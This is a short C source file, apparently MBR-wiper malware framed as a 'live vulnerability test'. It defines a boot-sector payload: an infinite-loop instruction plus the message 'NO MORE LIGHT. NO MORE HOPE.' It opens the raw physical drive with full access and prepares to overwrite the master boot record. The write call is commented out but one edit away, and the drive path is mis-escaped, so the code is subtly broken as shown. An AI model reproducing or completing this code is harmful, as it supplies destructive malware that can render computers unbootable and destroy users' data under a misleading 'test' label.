#include <windows.h>
#include <stdio.h>

unsigned char payload[] = {
    0xeb, 0xfe, 
    0x4E, 0x4F, 0x20, 0x4D, 0x4F, 0x52, 0x45, 0x20, 0x4C, 0x49, 0x47, 0x48, 0x54, 0x2E,
    0x0D, 0x0A,
    0x4E, 0x4F, 0x20, 0x4D, 0x4F, 0x52, 0x45, 0x20, 0x48, 0x4F, 0x50, 0x45, 0x2E
};

int main() {
    HANDLE drive;
    DWORD bytesWritten;

    printf("--- MYONECROSIS: LIVE VULNERABILITY TEST ---\n");
    printf("[!] WARNING: Testing real MBR overwrite logic.\n");

    drive = CreateFileA("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (drive == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Could not open drive. Run as Administrator!\n");
        return 1;
    }

    printf("[SUCCESS] Drive handle obtained. Ready for test write...\n");
    
    // WriteFile(drive, payload, sizeof(payload), &bytesWritten, NULL);

    CloseHandle(drive);
    printf("[DONE] Test complete. Handle closed.\n");
    return 0;
}
